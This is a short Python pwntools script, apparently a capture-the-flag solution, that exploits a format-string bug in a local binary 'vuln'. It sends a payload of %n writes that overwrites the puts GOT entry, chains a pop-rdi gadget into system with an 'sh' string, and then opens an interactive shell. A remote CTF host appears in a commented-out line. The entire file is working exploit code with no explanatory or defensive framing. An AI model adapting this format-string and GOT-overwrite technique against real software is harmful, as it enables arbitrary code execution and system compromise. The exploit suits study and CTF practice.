from pwn import *

#r = remote("got.ictf.kctf.cloud", 1337)
r = process("./vuln")
gdb.attach(r, api=True)

system = 0x00000000004010b0
puts_got = 0x404018
pop_rdi_ret = 0x0000000000401323
sh = 0x00404500
bin_sh = 0x1b1117 #32 %6$p				#10	    #11		#12		#13		#14
payload = b"%14$n%26739p%11$n%4172456p%13$n-" + p64(pop_rdi_ret) + p64(sh) + p64(system) + p64(puts_got) + p64(puts_got + 4)

r.sendline(payload)
r.interactive()
